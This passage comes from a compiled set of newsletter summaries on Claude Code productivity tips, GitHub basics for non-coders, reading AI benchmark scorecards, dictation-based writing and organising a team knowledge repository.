-<h2 id="part-2-external-data"><a class="header" href="#part-2-external-data">Part 2: External Data</a></h2>
-<p><strong>Two universal principles:</strong></p>
-<ol>
-<li><strong>Caching</strong> – fetch external data on intervals (every 5-15 min), not every few seconds</li>
-<li><strong>Conditional display</strong> – show/hide based on conditions (time of day, whether an event is on)</li>
-</ol>
-<h3 id="three-data-sources"><a class="header" href="#three-data-sources">Three Data Sources</a></h3>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Source</th><th>Examples</th><th>Setup</th></tr>
-</thead>
-<tbody>
-<tr><td><strong>Web</strong></td><td>Weather, air quality, stocks, sports, transit, countdown timers</td><td>None</td></tr>
-<tr><td><strong>CLI tools</strong></td><td>Git branch, uncommitted files, open PRs (via <code>gh</code>)</td><td>Install tools</td></tr>
-<tr><td><strong>MCP/API</strong></td><td>Gmail count, calendar events, Slack unreads</td><td>One-time MCP setup</td></tr>
-</tbody>
-</table>
-</div>
-<h3 id="google-workspace-mcp-setup-15-min"><a class="header" href="#google-workspace-mcp-setup-15-min">Google Workspace MCP Setup (~15 min)</a></h3>
-<ol>
-<li>Create a Google Cloud project</li>
-<li>Configure OAuth consent screen</li>
-<li>Create OAuth credentials (Desktop app type)</li>
-<li>Add yourself as a test user</li>
-<li>Enable Google APIs (Gmail, Calendar, Drive, Docs, Sheets, Slides)</li>
-<li>Add credentials to Claude Code</li>
-<li>Authenticate via browser</li>
-<li>Restart Claude Code</li>
-</ol>
-<p>Once connected, Google data is available for everything, not just the status line.</p>
-<h2 id="key-takeaway"><a class="header" href="#key-takeaway">Key Takeaway</a></h2>
-<p>Start with the basics (model, folder, context bar) and add more as you notice what keeps pulling you out of your workflow. The pattern is always: tell Claude what you want to see, Claude figures out how to get the data.</p>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="cc4e-8-keeping-up-with-the-claude-code-treadmill-30-tips--tricks"><a class="header" href="#cc4e-8-keeping-up-with-the-claude-code-treadmill-30-tips--tricks">CC4E #8: Keeping Up with the Claude Code Treadmill (30 Tips &amp; Tricks)</a></h1>
-<p><strong>Author:</strong> Hannah Stulberg | <strong>Published:</strong> 2026-05-04</p>
-<p>30 tips curated from 1,500+ hours of use. Don’t set up all 30 at once – pick the 2-3 that solve a problem you’re feeling right now.</p>
-<h2 id="section-1-make-cursor-feel-like-yours-tips-1-5"><a class="header" href="#section-1-make-cursor-feel-like-yours-tips-1-5">Section 1: Make Cursor Feel Like Yours (Tips 1-5)</a></h2>
-<ol>
-<li><strong>Pick a Cursor theme</strong> – browse built-in, install from marketplace, or have Claude build a custom one</li>
-<li><strong>Tame terminal panel</strong> – rename tabs, color-code, add icons, drag to reorder, split panes</li>
-<li><strong>Markdown editor extension</strong> – options: Mark Sharp (best feel, deletes images on save), Markdown Live Editor (preserves images, mangles formatting), Markdown Inline Editor (fades syntax), built-in preview (side-by-side, no inline editing)</li>
-<li><strong>Surface ~/.claude/ folder</strong> – add to workspace via File &gt; Add Folder to Workspace</li>
-<li><strong>Build Cursor workspaces</strong> – group multiple folders; each maintains its own CLAUDE.md and context</li>
-</ol>
-<h2 id="section-2-see-what-claude-is-doing-tips-6-9"><a class="header" href="#section-2-see-what-claude-is-doing-tips-6-9">Section 2: See What Claude Is Doing (Tips 6-9)</a></h2>
-<ol start="6">
-<li><strong>Ctrl+O</strong> – live stream of every file opened, tool called, reasoning step. 10% higher success rate for experienced users</li>
-<li><strong>/context</strong> – breakdown of context usage by category (system prompt, tools, memory, MCPs, messages). Reveals bloated CLAUDE.md or context-heavy skills</li>
-<li><strong>claude-counter</strong> – Chrome extension adding live context bar on claude.ai</li>
-<li><strong>DeepWiki</strong> – swap “github.com” for “deepwiki.com” in any repo URL for auto-generated docs and architecture diagrams</li>
-</ol>
-<h2 id="section-3-cleaner-source-material-tips-10-12"><a class="header" href="#section-3-cleaner-source-material-tips-10-12">Section 3: Cleaner Source Material (Tips 10-12)</a></h2>
-<p>Markdown is 1/3 to 1/2 the tokens of PDFs/Word docs and produces higher-quality output.</p>
-<ol start="10">
-<li><strong>Google Workspace files as markdown</strong> – manual (download as .md) or automated via <code>gws</code> CLI</li>
-<li><strong>markitdown</strong> – Microsoft’s open-source tool. Converts PDF, Word, Excel, PowerPoint to markdown. Works on individual files or entire folders</li>
-<li><strong>Firecrawl</strong> – returns full page content as clean markdown (unlike WebFetch which returns a summary). Scrape URLs, crawl sites, map site URLs, deep research. Free tier: 500 pages</li>
-</ol>
-<h2 id="section-4-connect-claude-to-the-web-tips-13-15"><a class="header" href="#section-4-connect-claude-to-the-web-tips-13-15">Section 4: Connect Claude to the Web (Tips 13-15)</a></h2>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Tool</th><th>What it does</th><th>Best for</th></tr>
-</thead>
-<tbody>
-<tr><td><strong>Claude in Chrome</strong> (Tip 13)</td><td>Reads/controls open Chrome tabs with your login state</td><td>Acting on apps you’re signed into</td></tr>
-<tr><td><strong>Playwright MCP</strong> (Tip 14)</td><td>Fresh browser, no inherited logins</td><td>Clean testing, cross-browser checks</td></tr>
-<tr><td><strong>Chrome DevTools MCP</strong> (Tip 15)</td><td>Inspects: performance traces, network, console, Lighthouse</td><td>Debugging, not acting</td></tr>
-</tbody>
-</table>
-</div>
-<p>These give Claude browser <strong>control</strong>. Firecrawl gives Claude browser <strong>content</strong>.</p>
-<h2 id="section-5-visual-work-tips-16-19"><a class="header" href="#section-5-visual-work-tips-16-19">Section 5: Visual Work (Tips 16-19)</a></h2>
-<ol start="16">
-<li><strong>/canvas-design</strong> – generate PNGs (diagrams, posters, explanatory visuals)</li>
-<li><strong>Image editing</strong> – resize, crop, convert, watermark, annotate, combine into PDFs</li>
-<li><strong>Mermaid diagrams</strong> – open-source diagramming language in markdown. Claude writes the code, preview renders it. Export to PNG via mermaid-cli for sharing</li>
-<li><strong>Local HTML files</strong> – quick visual previews, layout prototypes, interactive demos. Pair with Chrome extension for Claude to verify its own output</li>
-</ol>
-<h2 id="section-6-get-more-from-every-session-tips-20-26"><a class="header" href="#section-6-get-more-from-every-session-tips-20-26">Section 6: Get More from Every Session (Tips 20-26)</a></h2>
-<ol start="20">
-<li><strong>Terminal shortcuts</strong> – Option+arrow (jump word), Ctrl+A/E (start/end of line), Option+Backspace (delete word), Cmd+K (clear visible terminal)</li>
-<li><strong>/branch</strong> – creates parallel sub-sessions inheriting full parent context. Name original first with /rename</li>
-<li><strong>/btw</strong> – side questions without contaminating main session context</li>
-<li><strong>Caveman mode</strong> – compresses Claude’s output ~75%. Three levels: lite, full, ultra. Turn off for prose/docs</li>
-<li><strong>RTK (Rust Token Killer)</strong> – compresses Claude’s input (terminal output) by 60-90%. Install via brew. Pair with Caveman for compounding savings</li>
-<li><strong>/voice and Wispr Flow</strong> – three options: /voice (built-in, hold space), voice button in apps, Wispr Flow (system-wide paid dictation)</li>
-<li><strong>/loop</strong> – reruns a prompt on a schedule or self-paced. Use for: keeping Claude going on long plans, waiting for conditions then acting, variable-interval monitoring</li>
-</ol>
-<h2 id="section-7-take-claude-off-your-laptop-tips-27-29"><a class="header" href="#section-7-take-claude-off-your-laptop-tips-27-29">Section 7: Take Claude Off Your Laptop (Tips 27-29)</a></h2>
-<p>Cloud sessions have MCPs and repo contents but NOT local MCPs, local CLIs, or user-level skills.</p>
-<ol start="27">
-<li><strong>Claude mobile app</strong> – Code tab for cloud sessions. Requires files in GitHub. Edits stay on temp branch until PR</li>
-<li><strong>/teleport and /remote-control</strong> – teleport pulls cloud session to laptop; remote-control lets phone act as remote keyboard (laptop must stay awake: <code>caffeinate -dims claude</code>)</li>
-<li><strong>Claude Code Channels</strong> – text Claude via Telegram/Discord, responds from active laptop session. Requires <code>--dangerously-skip-permissions</code></li>
-</ol>
-<h2 id="section-8-just-for-fun-tip-30"><a class="header" href="#section-8-just-for-fun-tip-30">Section 8: Just for Fun (Tip 30)</a></h2>
-<ol start="30">
-<li><strong>Custom thinking verbs</strong> – Claude cycles through ~185 verbs (“Pondering…”, “Cogitating…”). Customize via <code>spinnerVerbs</code> in <code>~/.claude/settings.json</code></li>
-</ol>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="tool-school-series-1"><a class="header" href="#tool-school-series-1">Tool School Series</a></h1>
-<p>By Hannah Stulberg. Deep dives on tools and concepts that matter for AI-native workflows.</p>
-<ol>
-<li><a href="#tool-school-github-101-github-is-the-new-google-drive">GitHub 101</a> - with Sidwyn Koh</li>
-<li><a href="#tool-school-benchmarking-101-how-to-read-ai-model-report-cards">Benchmarking 101</a> - with Akshat Khandelwal</li>
-</ol>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="tool-school-github-101-github-is-the-new-google-drive"><a class="header" href="#tool-school-github-101-github-is-the-new-google-drive">Tool School: GitHub 101 (GitHub is the New Google Drive)</a></h1>
-<p><strong>Authors:</strong> Hannah Stulberg and Sidwyn Koh | <strong>Published:</strong> 2026-02-27</p>
-<p>Everything needed to start using GitHub – no coding required. Applies to any AI coding tool (Claude Code, Cursor, Antigravity, Codex).</p>
-<h2 id="core-metaphor-github-is-the-new-google-drive"><a class="header" href="#core-metaphor-github-is-the-new-google-drive">Core Metaphor: GitHub is the New Google Drive</a></h2>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>GitHub</th><th>Google Drive Equivalent</th></tr>
-</thead>
-<tbody>
-<tr><td>Repository</td><td>Shared folder</td></tr>
-<tr><td>Commit</td><td>Save</td></tr>
-<tr><td>Branch</td><td>Your copy</td></tr>
-<tr><td>Main</td><td>The original</td></tr>
-<tr><td>Push/Pull</td><td>Sync</td></tr>
-<tr><td>Pull Request</td><td>“Review my edits”</td></tr>
-</tbody>
-</table>
-</div>
-<h2 id="setup-checklist"><a class="header" href="#setup-checklist">Setup Checklist</a></h2>
-<ol>
-<li><strong>GitHub account</strong> – github.com/signup</li>
-<li><strong>Git installed</strong> – <code>xcode-select --install</code> (Mac) or Git for Windows</li>
-<li><strong>Git configured</strong> – set name and email matching your GitHub account</li>
-<li><strong>SSH keys</strong> – “keycard” metaphor. Key pair: private stays local, public goes to GitHub. Generate with <code>ssh-keygen -t ed25519</code></li>
-<li><strong>GitHub CLI (gh)</strong> – interact with GitHub from terminal. Install from cli.github.com, auth with <code>gh auth login</code></li>
-<li><strong>GitHub MCP</strong> (optional) – gives Claude Code direct GitHub API access</li>
-</ol>
-<h2 id="the-daily-workflow-6-steps"><a class="header" href="#the-daily-workflow-6-steps">The Daily Workflow (6 Steps)</a></h2>
-<ol>
-<li><strong>Get to your branch</strong> – pull latest main + create new branch, or switch to existing</li>
-<li><strong>Make your edits</strong></li>
-<li><strong>Commit</strong> – save a snapshot with descriptive message. Commit early, commit often</li>
-<li><strong>Push</strong> – upload to GitHub. Until you push, work only exists locally</li>
-<li><strong>Open a pull request</strong> – “here are my changes, please review”</li>
-<li><strong>Merge</strong> – combine into the official version</li>
-</ol>
-<h2 id="key-concepts"><a class="header" href="#key-concepts">Key Concepts</a></h2>
-<h3 id="branches"><a class="header" href="#branches">Branches</a></h3>
-<ul>
-<li>Your own parallel copy of the project</li>
-<li>Main = trusted official version. Never edit it directly</li>
-<li>Name descriptively with lowercase and hyphens</li>
-</ul>
-<h3 id="pulling-two-scenarios"><a class="header" href="#pulling-two-scenarios">Pulling (Two Scenarios)</a></h3>
-<ul>
-<li>Someone pushed to your branch – pull to sync</li>
-<li>Main moved forward – pull main into your branch via merge (safe) or rebase (clean history, only when solo)</li>
-</ul>
-<h3 id="stashing"><a class="header" href="#stashing">Stashing</a></h3>
-<ul>
-<li><code>git stash</code> / <code>git stash pop</code> – temporarily set aside uncommitted changes when switching branches</li>
-</ul>
-<h3 id="commits"><a class="header" href="#commits">Commits</a></h3>
-<ul>
-<li>Two parts: review changes (git status, diff view), then save</li>
-<li>Messages: short, specific. Each commit = one coherent change</li>
-</ul>
-<h3 id="pull-requests"><a class="header" href="#pull-requests">Pull Requests</a></h3>
-<ul>
-<li>Creating a PR = “here are my changes, please review”</li>
-<li>Claude Code can write the PR title and description</li>
-<li>Add reviewers who know the area. Be specific, be kind in reviews</li>
-</ul>
-<h3 id="merging"><a class="header" href="#merging">Merging</a></h3>
-<ul>
-<li><strong>Squash and merge</strong> (recommended) – combines all commits into one clean commit</li>
-<li>After merging, delete the branch</li>
-</ul>
-<h3 id="merge-conflicts"><a class="header" href="#merge-conflicts">Merge Conflicts</a></h3>
-<ul>
-<li>When two people change the same lines. Not a bug, not your fault</li>
-<li>Claude Code can resolve them</li>
-<li>Prevention: pull main into your branch regularly</li>
-</ul>
-<h2 id="common-errors"><a class="header" href="#common-errors">Common Errors</a></h2>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Error</th><th>Cause</th><th>Fix</th></tr>
-</thead>
-<tbody>
-<tr><td>“Your branch is behind”</td><td>Local copy out of date</td><td><code>git pull</code></td></tr>
-<tr><td>“Merge conflict”</td><td>Same lines changed by two people</td><td>Resolve manually or with Claude</td></tr>
-<tr><td>“HEAD detached”</td><td>Checked out a commit, not a branch</td><td><code>git checkout main</code></td></tr>
-<tr><td>“Permission denied (publickey)”</td><td>SSH key issue</td><td>Revisit SSH setup</td></tr>
-<tr><td>Nested repo</td><td>Cloned inside another repo</td><td>Move repos side-by-side</td></tr>
-</tbody>
-</table>
-</div>
-<h2 id="important-rules"><a class="header" href="#important-rules">Important Rules</a></h2>
-<ul>
-<li>Don’t put repos inside cloud storage sync folders (conflicts with Git internals)</li>
-<li>Don’t clone a repo inside another repo (nested repos cause tracking conflicts)</li>
-<li>Keep repos side-by-side in a single folder like <code>~/projects</code></li>
-<li>If you commit an <code>.env</code> file, those secrets are in commit history forever</li>
-</ul>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="tool-school-benchmarking-101-how-to-read-ai-model-report-cards"><a class="header" href="#tool-school-benchmarking-101-how-to-read-ai-model-report-cards">Tool School: Benchmarking 101 (How To Read AI Model Report Cards)</a></h1>
-<p><strong>Authors:</strong> Hannah Stulberg and Akshat Khandelwal | <strong>Published:</strong> 2026-03-31</p>
-<p>Learn to read the scorecard behind every AI model launch. Core thesis: “The best model is the one that does the work you need, at a price you can justify, on benchmarks you understand.”</p>
-<h2 id="benchmarks-101"><a class="header" href="#benchmarks-101">Benchmarks 101</a></h2>
-<p><strong>Analogy:</strong> Benchmark scores are like SAT scores – a high SAT score doesn’t make someone a great colleague. Each measures one narrow skill.</p>
-<h3 id="three-scoring-systems"><a class="header" href="#three-scoring-systems">Three Scoring Systems</a></h3>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>System</th><th>How it works</th><th>Notes</th></tr>
-</thead>
-<tbody>
-<tr><td><strong>Pass@1</strong></td><td>One attempt per question</td><td>Closest to actual user experience. Most commonly reported</td></tr>
-<tr><td><strong>Pass@k</strong></td><td>Multiple attempts (8 or 16); any correct = pass</td><td>Always higher than pass@1. Some companies report this without clear labeling</td></tr>
-<tr><td><strong>Elo rating</strong></td><td>Head-to-head ranking (like chess)</td><td>Chatbot Arena uses this. Measures preference, not correctness</td></tr>
-</tbody>
-</table>
-</div>
-<h3 id="four-benchmark-categories"><a class="header" href="#four-benchmark-categories">Four Benchmark Categories</a></h3>
-<ol>
-<li><strong>Knowledge &amp; Reasoning</strong> – academic/professional knowledge (MMLU, GPQA Diamond, HLE, GDPval)</li>
-<li><strong>Coding</strong> – writing working code (SWE-bench Verified, SWE-bench Pro, SWE-Lancer)</li>
-<li><strong>Reasoning</strong> – novel problem-solving (ARC-AGI-2, ARC-AGI-3)</li>
-<li><strong>Agentic &amp; Computer Use</strong> – sustained multi-step professional work (OSWorld, tau2-bench, BigLaw Bench, Terminal-Bench 2.0)</li>
-</ol>
-<h3 id="key-benchmarks"><a class="header" href="#key-benchmarks">Key Benchmarks</a></h3>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Benchmark</th><th>What it tests</th><th>Current status</th></tr>
-</thead>
-<tbody>
-<tr><td>MMLU</td><td>16K questions, 57 subjects</td><td><strong>Saturated</strong> (88-93%)</td></tr>
-<tr><td>GPQA Diamond</td><td>448 PhD-level science questions</td><td>Approaching saturation (91-94%)</td></tr>
-<tr><td>HLE</td><td>2,500 expert questions, 100+ subjects (published in Nature)</td><td>Still differentiating (40-45%)</td></tr>
-<tr><td>SWE-bench Verified</td><td>500 real GitHub issues</td><td><strong>Contaminated</strong> – every frontier model trained on solutions</td></tr>
-<tr><td>SWE-bench Pro</td><td>1,900 tasks with private test cases</td><td>Current best coding benchmark</td></tr>
-<tr><td>SWE-Lancer</td><td>1,400+ real Upwork tasks ($50 to $32K)</td><td>80% SWE-bench = only 26% SWE-Lancer</td></tr>
-<tr><td>ARC-AGI-3</td><td>Interactive game environments, no instructions</td><td>Widest human-AI gap (humans 100%, best AI 0.37%)</td></tr>
-<tr><td>ARC-AGI-2</td><td>Visual pattern puzzles</td><td>Scores still spread (53-77%). Measures cost alongside accuracy</td></tr>
-<tr><td>OSWorld</td><td>Real computer tasks in OS environments</td><td>GPT-5.4 surpassed human performance (75% vs 72.4%)</td></tr>
-</tbody>
-</table>
-</div>
-<h2 id="why-benchmarks-expire"><a class="header" href="#why-benchmarks-expire">Why Benchmarks Expire</a></h2>
-<ol>
-<li><strong>Saturation</strong> – scores converge, spread disappears (MMLU lasted ~3 years, GPQA ~2)</li>
-<li><strong>Contamination</strong> – test answers leak into training data (SWE-bench Verified confirmed contaminated)</li>
-<li><strong>Goodhart’s Law</strong> – when a measure becomes a target, it ceases to be a good measure</li>
-</ol>
-<h3 id="three-questions-for-any-benchmark"><a class="header" href="#three-questions-for-any-benchmark">Three Questions for Any Benchmark</a></h3>
-<ol>
-<li>How long has the test been public?</li>
-<li>Who created it?</li>
-<li>Are the scores still spread out?</li>
-</ol>
-<h3 id="trust-tiers"><a class="header" href="#trust-tiers">Trust Tiers</a></h3>
-<ul>
-<li><strong>High relevance:</strong> ARC-AGI-3, ARC-AGI-2, HLE, SWE-bench Pro, OSWorld, Terminal-Bench 2.0</li>
-<li><strong>Moderate:</strong> GPQA Diamond, tau2-bench, BigLaw Bench, GDPval, MMLU Pro</li>
-<li><strong>Low:</strong> MMLU, SWE-bench Verified, HumanEval</li>
-</ul>
-<p>Formula: independent creation + wide score spread + contamination resistance = high relevance</p>
-<h2 id="head-to-head-as-of-article-date"><a class="header" href="#head-to-head-as-of-article-date">Head-to-Head (as of article date)</a></h2>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Strength</th><th>Leader</th></tr>
-</thead>
-<tbody>
-<tr><td>Academic reasoning</td><td>Gemini 3.1 Pro</td></tr>
-<tr><td>Professional tasks</td><td>GPT-5.4</td></tr>
-<tr><td>Enterprise agentic work</td><td>Opus 4.6</td></tr>
-</tbody>
-</table>
-</div>
-<p>Top 5 models separated by just 19 Elo points in Chatbot Arena.</p>
-<h2 id="cost"><a class="header" href="#cost">Cost</a></h2>
-<ul>
-<li>API pricing: input tokens vs output tokens, per million</li>
-<li>Same benchmark scores, wildly different prices: DeepSeek R1 at $2.19/M output vs $15 (GPT-5.4) vs $25 (Opus 4.6)</li>
-<li>Sonnet 4.6 delivers ~95% of Opus 4.6 performance at 60% of the cost</li>
-<li>For consumer subscriptions ($20/month), cost shows up as rate limits, not per-token</li>
-</ul>
-<h2 id="four-things-to-watch-in-any-launch"><a class="header" href="#four-things-to-watch-in-any-launch">Four Things to Watch in Any Launch</a></h2>
-<ol>
-<li>What benchmarks are <strong>missing</strong> from the scorecard? (selective disclosure)</li>
-<li>What <strong>baseline</strong> is the company comparing against? (may be outdated)</li>
-<li>How does <strong>Chatbot Arena</strong> compare to the benchmark story?</li>
-<li>How <strong>transparent</strong> is the methodology?</li>
-</ol>
-<h2 id="independent-sources-for-checking-scores"><a class="header" href="#independent-sources-for-checking-scores">Independent Sources for Checking Scores</a></h2>
-<ul>
-<li>Chatbot Arena, Artificial Analysis, ARC Prize Leaderboard, Scale AI SWE-bench Pro Leaderboard, Stanford CRFM Foundation Model Transparency Index</li>
-</ul>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="standalone-articles-1"><a class="header" href="#standalone-articles-1">Standalone Articles</a></h1>
-<p>Individual articles from In the Weeds, not part of a numbered series.</p>
-<ul>
-<li><a href="#skip-the-terminal-and-8-other-claude-code-tricks-for-non-technical-users">Skip the Terminal</a> - 9 Claude Code tricks for non-technical users</li>
-<li><a href="#stop-typing-start-talking-dictation--ai-editing">Stop Typing, Start Talking</a> - Dictation + AI editing workflow</li>
-<li><a href="#build-a-team-os-with-claude-code">Build a Team OS</a> - by Aakash Gupta, featuring Hannah Stulberg</li>
-<li><a href="#business-sense-for-engineers-the-missing-half-of-product-sense">Business Sense for Engineers</a> - with Sidwyn Koh</li>
-</ul>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="skip-the-terminal-and-8-other-claude-code-tricks-for-non-technical-users"><a class="header" href="#skip-the-terminal-and-8-other-claude-code-tricks-for-non-technical-users">Skip the Terminal (And 8 Other Claude Code Tricks for Non-Technical Users)</a></h1>
-<p><strong>Author:</strong> Hannah Stulberg | <strong>Published:</strong> 2026-01-01</p>
-<p>9 tips from 350+ hours of Claude Code use. The core problem: most AI tools require enormous effort to provide enough context for useful output.</p>
-<h2 id="the-9-tricks"><a class="header" href="#the-9-tricks">The 9 Tricks</a></h2>
-<h3 id="1-the-terminal-is-a-black-box--use-an-ide"><a class="header" href="#1-the-terminal-is-a-black-box--use-an-ide">1. The Terminal Is a Black Box – Use an IDE</a></h3>
-<ul>
-<li>The standalone terminal is intimidating; you can’t see files, preview docs, or review changes</li>
-<li>An IDE gives you file browser, text editor, and terminal in one window</li>
-<li>Benefits: see file structure, preview markdown, review changes visually, access hidden <code>.claude/</code> folder</li>
-<li>Hannah uses Cursor, but VS Code/Windsurf work too</li>
-</ul>
-<h3 id="2-cursor-lets-you-pick-the-best-model"><a class="header" href="#2-cursor-lets-you-pick-the-best-model">2. Cursor Lets You Pick the Best Model</a></h3>
-<ul>
-<li>Cursor’s built-in chat runs prompts against different models (Claude, GPT, Gemini, Grok)</li>
-<li>Test the same prompt across models, compare results, feed the better output back into Claude Code</li>
-<li>Avoids single-model lock-in</li>
-</ul>
-<h3 id="3-show-hidden-files"><a class="header" href="#3-show-hidden-files">3. Show Hidden Files</a></h3>
-<ul>
-<li>Claude Code stores configuration in the <code>.claude/</code> folder containing:
-<ul>
-<li><strong>Skills</strong> – markdown files that teach Claude specialized knowledge (auto-invoked)</li>
-<li><strong>Commands</strong> – shortcuts triggered by <code>/command-name</code> (must be explicitly invoked)</li>
-<li><strong>Agents</strong> – specialized AI personalities with isolated context</li>
-<li><strong>CLAUDE.md</strong> – project context, preferences, workflow</li>
-</ul>
-</li>
-</ul>
-<h3 id="4-drag-and-drop-files"><a class="header" href="#4-drag-and-drop-files">4. Drag and Drop Files</a></h3>
-<ul>
-<li>Drag images or documents directly into Claude Code’s command line for analysis</li>
-<li>Most shared files don’t need permanent saving</li>
-</ul>
-<h3 id="5-run-parallel-sessions"><a class="header" href="#5-run-parallel-sessions">5. Run Parallel Sessions</a></h3>
-<ul>
-<li>Open multiple terminals for separate Claude Code sessions</li>
-<li>Each gets its own context window dedicated to one task</li>
-<li>Mixing unrelated tasks in one session degrades output quality</li>
-<li>Rename terminals by task for easy identification</li>
-</ul>
-<h3 id="6-split-terminals"><a class="header" href="#6-split-terminals">6. Split Terminals</a></h3>
-<ul>
-<li>Split terminal views to monitor 2-3 sessions at once</li>
-<li>See immediately when a task completes</li>
-</ul>
-<h3 id="7-watch-the-status-line"><a class="header" href="#7-watch-the-status-line">7. Watch the Status Line</a></h3>
-<ul>
-<li>Shows: model, working directory, context usage, session cost</li>
-<li>Manually compact (<code>/compact</code>) at 50-60% usage, don’t wait for auto-compaction at the limit</li>
-</ul>
-<h3 id="8-stop-typing--talk-instead"><a class="header" href="#8-stop-typing--talk-instead">8. Stop Typing – Talk Instead</a></h3>
-<ul>
-<li>Use Wispr Flow for voice dictation</li>
-<li>Voice removes friction – explain conversationally instead of carefully typing</li>
-</ul>
-<h3 id="9-every-session-is-a-chance-to-teach-claude"><a class="header" href="#9-every-session-is-a-chance-to-teach-claude">9. Every Session Is a Chance to Teach Claude</a></h3>
-<p>After every session ask: “Could I make this faster next time?”</p>
-<ul>
-<li>Same explanation twice? Add it to CLAUDE.md</li>
-<li>Same prompt sequence? Turn it into a command</li>
-<li>Needs specialized context? Build a skill or agent</li>
-<li>Getting 1% better daily compounds fast</li>
-</ul>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="stop-typing-start-talking-dictation--ai-editing"><a class="header" href="#stop-typing-start-talking-dictation--ai-editing">Stop Typing, Start Talking: Dictation + AI Editing</a></h1>
-<p><strong>Author:</strong> Hannah Stulberg | <strong>Published:</strong> 2026-01-05</p>
-<p>Claims this workflow cuts long-form writing time by at least 50%, saving 10+ hours per week.</p>
-<h2 id="the-core-insight"><a class="header" href="#the-core-insight">The Core Insight</a></h2>
-<ul>
-<li><strong>Typing speed</strong> (how fast you copy known text) is NOT <strong>writing speed</strong> (how fast you compose original content)</li>
-<li>When you type, you edit before finishing a thought – writing and editing happen simultaneously</li>
-<li>Speaking speed: 130-160 WPM (3-4x faster than typing)</li>
-<li>Dictation separates idea generation from editing</li>
-</ul>
-<h2 id="the-workflow-three-tiers"><a class="header" href="#the-workflow-three-tiers">The Workflow: Three Tiers</a></h2>
-<h3 id="tier-1-basic--dictate-into-any-ai-chat"><a class="header" href="#tier-1-basic--dictate-into-any-ai-chat">Tier 1: Basic – Dictate into Any AI Chat</a></h3>
-<p>Tools you already have (ChatGPT, Claude, any AI with voice input).</p>
-<ol>
-<li>Dictate raw thoughts without worrying about structure or filler words</li>
-<li>Ask AI to clean it up (“tighten the language and format as a professional email”)</li>
-<li>Review, tweak, send</li>
-</ol>
-<p>Even stopping at this tier saves hours per week.</p>
-<h3 id="tier-2-intermediate--wispr-flow"><a class="header" href="#tier-2-intermediate--wispr-flow">Tier 2: Intermediate – Wispr Flow</a></h3>
-<ul>
-<li>Significantly better transcription accuracy than ChatGPT/Claude native voice</li>
-<li>Lets you dictate into ANY app (Slack, Gmail, Notion, Google Docs) – even apps without built-in voice input</li>
-<li>Two sub-workflows: dictate into AI tools for full cleanup, or dictate directly into any app</li>
-</ul>
-<h3 id="tier-3-advanced--ai-coding-tools-with-saved-skills"><a class="header" href="#tier-3-advanced--ai-coding-tools-with-saved-skills">Tier 3: Advanced – AI Coding Tools with Saved Skills</a></h3>
-<ul>
-<li>Tools like Claude Code and Cursor let you save custom editing instructions as reusable skills/commands</li>
-<li>Build prompts that already know your writing style, formatting preferences, and content types</li>
-<li>Highest-leverage but requires upfront setup</li>
-</ul>
-<h2 id="when-to-use-1"><a class="header" href="#when-to-use-1">When to Use</a></h2>
-<ul>
-<li>Start with longer-form content (docs, emails, project updates) where typing is painfully slow</li>
-<li>This is NOT about replacing typing for everything</li>
-<li>Best for: any content longer than a few sentences</li>
-</ul>
-<h2 id="key-takeaway-1"><a class="header" href="#key-takeaway-1">Key Takeaway</a></h2>
-<p>“You don’t need to type faster. You need to stop editing while you type. Dictate first. Let AI polish it. Send.”</p>
-<div style="break-before: page; page-break-before: always;"></div>
-<h1 id="build-a-team-os-with-claude-code"><a class="header" href="#build-a-team-os-with-claude-code">Build a Team OS with Claude Code</a></h1>
-<p><strong>Author:</strong> Aakash Gupta (featuring Hannah Stulberg) | <strong>Published:</strong> 2026-04-07</p>
-<p>A five-part framework for building a “Team OS” – a shared GitHub repo as a team’s single source of truth, queryable by Claude Code so team members self-serve instead of routing every question through the PM.</p>
-<h2 id="1-the-team-os-structure"><a class="header" href="#1-the-team-os-structure">1. The Team OS Structure</a></h2>
-<p><strong>Problem:</strong> The PM is the human router. Every question goes through them. Doesn’t scale.</p>
-<p><strong>Solution:</strong> One shared repo where every function checks in their work. Everyone self-serves.</p>
-<h3 id="three-components"><a class="header" href="#three-components">Three Components</a></h3>
-<ol>
-<li>
-<p><strong>Root CLAUDE.md</strong> – loaded every session. Contains exactly three things:</p>
-<ul>
-<li>Doc index mapping where every type of info lives</li>
-<li>Team roster with Slack and GitHub handles</li>
-<li>Key Slack channels mapped to IDs/purposes</li>
-<li>Keep it under one page</li>
-</ul>
-</li>
-<li>
-<p><strong>Nested doc indexes</strong> – every major folder gets its own CLAUDE.md as a navigation map (not content). Enables precise navigation without burning context</p>
-</li>
-<li>
-<p><strong>Folder architecture</strong> – three top-level sections:</p>
-<ul>
-<li><code>.claude/</code> for shared agents, commands, skills</li>
-<li>Product development folders (customers, competitive, PRDs, strategy, analytics, engineering)</li>
-<li>Team folder (onboarding, retros)</li>
-</ul>
-</li>
-</ol>
-<p><strong>Key insight:</strong> Every level of nesting is a context-saving decision.</p>
-<h2 id="2-token-efficiency-framework"><a class="header" href="#2-token-efficiency-framework">2. Token Efficiency Framework</a></h2>
-<div class="table-wrapper">
-<table>
-<thead>
-<tr><th>Tier</th><th>What</th><th>Size</th><th>When loaded</th></tr>
-</thead>
-<tbody>
-<tr><td>Tier 1 (Always)</td><td>Root CLAUDE.md, team roster, channels</td><td>&lt; 500 tokens</td><td>Every session</td></tr>
-<tr><td>Tier 2 (On query)</td><td>Folder-level CLAUDE.md files</td><td>200-500 tokens each</td><td>When Claude navigates to folder</td></tr>
-<tr><td>Tier 3 (On demand)</td><td>Actual content (PRDs, transcripts, SQL)</td><td>Hundreds-thousands</td><td>When specifically needed</td></tr>
-</tbody>
-</table>
-</div>
-<h3 id="three-failure-modes"><a class="header" href="#three-failure-modes">Three Failure Modes</a></h3>
-<ol>
-<li>Flat repo, no CLAUDE.md files – Claude runs expensive explore agents</li>
